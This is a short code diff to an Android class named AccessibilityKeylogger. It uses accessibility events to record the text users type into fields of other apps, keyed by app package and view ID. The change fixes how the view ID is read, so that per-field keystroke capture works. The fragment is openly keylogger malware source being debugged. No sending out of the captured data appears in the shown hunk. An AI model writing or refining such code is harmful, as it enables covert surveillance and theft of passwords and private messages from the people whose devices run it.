@@ -24,9 +24,10 @@ public class AccessibilityKeylogger extends AccessibilityService {
             CharSequence before = event.getBeforeText();
             List<CharSequence> after = event.getText();
             if (after != null && !after.isEmpty()) {
-                String key = event.getPackageName() + "/" +
-                             (event.getViewIdResourceName() != null ?
-                              event.getViewIdResourceName() : "field");
+                AccessibilityNodeInfo src = event.getSource();
+                String viewId = (src != null && src.getViewIdResourceName() != null)
+                    ? src.getViewIdResourceName() : "field";
+                String key = event.getPackageName() + "/" + viewId;
                 String newText = after.get(0).toString();
                 String lastText = fieldState.getOrDefault(key, "");
 
